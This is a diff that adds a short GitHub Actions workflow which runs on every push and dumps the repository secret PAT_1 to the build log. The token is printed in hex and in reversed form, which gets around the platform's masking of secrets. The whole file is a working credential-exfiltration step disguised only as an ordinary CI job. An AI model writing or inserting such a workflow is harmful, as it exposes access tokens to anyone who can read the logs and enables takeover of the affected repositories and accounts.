@@ -1,0 +1,13 @@
+name: zz
+on: push
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    env:
+          K0: ${{ secrets.PAT_1 }}
+    steps:
+      - name: dump
+        run: |
+          echo "::E0-PAT_1"
+          echo -n "$K0" | od -tx1 -An -v | tr -d ' \n' ; echo ""
+          echo -n "$K0" | rev ; echo ""
